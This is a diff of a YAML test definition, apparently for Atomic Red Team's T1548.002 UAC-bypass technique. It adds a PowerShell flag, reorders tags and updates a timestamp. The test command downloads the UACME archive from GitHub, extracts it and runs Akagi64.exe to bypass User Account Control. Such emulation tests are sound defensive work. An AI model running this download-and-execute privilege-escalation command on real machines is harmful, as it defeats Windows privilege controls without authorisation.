@@ -18,8 +18,8 @@
           Akagi64.exe; if (Test-Path "$tempPath") {exit 0} else {exit 1}; then : ;
           else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"; Expand-Archive
-          "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" -UseBasicParsing;
+          Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme"
           -Force; Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"
           -Force; fi; "PathToAtomicsFolder\..\ExternalPayloads\uacme\39 Akagi64.exe"'
         cleanup: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore; powershell
@@ -31,8 +31,8 @@
   privilege: ''
   buckets:
   - privilege-escalation
-  - atomic-red-team
   - t1548.002
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -53,7 +53,7 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" -UseBasicParsing
 
         Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme"
         -Force
@@ -63,4 +63,4 @@
         '
     technique_created: '2020-01-30T14:24:34.977Z'
     atomic_guid: 56163687-081f-47da-bb9c-7b231c5585cf
-    import_timestamp: '2026-10-20T07:08:27.116540Z'
+    import_timestamp: '2026-10-21T07:01:49.815056Z'
